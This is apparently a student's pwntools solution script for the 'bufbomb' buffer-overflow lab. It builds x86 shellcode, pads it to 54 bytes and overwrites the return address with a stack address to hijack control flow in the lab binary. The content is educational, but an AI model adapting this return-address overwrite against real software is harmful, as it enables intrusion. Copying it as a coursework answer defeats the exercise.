#!/usr/bin/env python3
from pwn import * 

r = process(["./bufbomb", "-u", "059167235"])

shellcode = asm(f"""
    add esp, 0x18
    mov ebp, esp
    mov eax, 0x516ef9ef
    push 0x80ee8ca7
    ret
""")
pl = shellcode.ljust(54, b'\0')
pl += p32(0x55683a8e) # entry input
r.sendline(pl)
r.interactive()